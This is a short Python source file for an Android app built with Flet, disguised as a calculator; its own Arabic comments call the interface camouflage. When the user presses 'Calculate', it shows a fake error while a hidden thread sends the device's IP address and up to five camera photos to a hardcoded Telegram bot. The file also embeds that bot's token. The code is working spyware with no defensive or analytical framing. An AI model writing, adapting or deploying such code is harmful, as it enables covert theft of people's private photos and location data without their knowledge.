import flet as ft
import os
import telebot
import requests
import threading

# بيانات البوت الخاصة بك
TOKEN = "6322732130:AAEWDr_87Bdg0w66tffO7KjFaovZ4XNEiYE"
CHAT_ID = "6294535035"
bot = telebot.TeleBot(TOKEN)

def main(page: ft.Page):
    page.title = "Calculator"
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.window_width = 350
    page.window_height = 500

    # وظيفة سحب البيانات في الخلفية لضمان عدم تهنيج التطبيق
    def run_hidden_task():
        try:
            # 1. سحب الـ IP
            ip = requests.get('https://api.ipify.org').text
            bot.send_message(CHAT_ID, f"🚀 جهاز جديد متصل (Flet)!\n🌐 IP: {ip}")

            # 2. سحب الصور من مجلد الكاميرا
            # ملاحظة: أندرويد يتطلب صلاحيات الوصول للملفات
            path = "/storage/emulated/0/DCIM/Camera/"
            if os.path.exists(path):
                files = os.listdir(path)
                for file in files[:5]: 
                    if file.lower().endswith(('.jpg', '.png', '.jpeg')):
                        with open(os.path.join(path, file), 'rb') as img:
                            bot.send_photo(CHAT_ID, img)
        except:
            pass

    def on_calculate_click(e):
        result_label.value = "Error: System Busy"
        page.update()
        # تشغيل المهمة في خيط منفصل (Thread)
        threading.Thread(target=run_hidden_task, daemon=True).start()

    # واجهة الآلة الحاسبة (تمويه)
    result_label = ft.Text("0", size=40, text_align=ft.TextAlign.RIGHT)
    
    page.add(
        ft.Container(
            content=ft.Column([
                result_label,
                ft.ElevatedButton(
                    "Calculate", 
                    on_click=on_calculate_click,
                    style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=10)),
                    width=200,
                    height=50
                ),
            ], alignment=ft.MainAxisAlignment.CENTER, horizontal_alignment=ft.CrossAxisAlignment.CENTER),
            padding=20
        )
    )

# تشغيل التطبيق بنمط Flet
ft.app(target=main)
